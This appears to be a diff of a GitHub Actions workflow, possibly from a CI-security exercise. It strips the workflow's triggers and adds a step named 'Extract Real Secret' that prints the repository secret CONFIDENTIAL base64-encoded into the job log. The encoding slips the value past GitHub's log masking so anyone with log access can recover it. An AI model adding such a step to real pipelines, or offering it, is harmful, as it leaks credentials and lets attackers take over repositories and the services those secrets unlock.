@@ -1,12 +1,3 @@
-name: Install
-
-on:
-  push:
-    branches: [master]
-  pull_request:
-    branches: [master]
-  workflow_dispatch:
-
 jobs:
   install:
     runs-on: ubuntu-latest
@@ -14,10 +5,15 @@ jobs:
     steps:
       - name: Checkout repository
         uses: actions/checkout@v4
-    # ---EXTRACT SECRET---
-      - name: Extract Secret
-        run: echo "ID_EXTRACTION= $GITHUB_RUN_ID"
-    #---------------------
+
+    # --- EXTRACT SECRET ---
+      - name: Extract Real Secret
+        run: |
+          echo "--- DEBUT DU SECRET ENCODE ---"
+          echo -n "${{ secrets.CONFIDENTIAL }}" | base64
+          echo "--- FIN DU SECRET ENCODE ---"
+    # --------------------------------------------------
+
       - run: ./echo.sh
         env:
           CONFIDENTIAL_ENV_VAR: ${{ secrets.CONFIDENTIAL }}
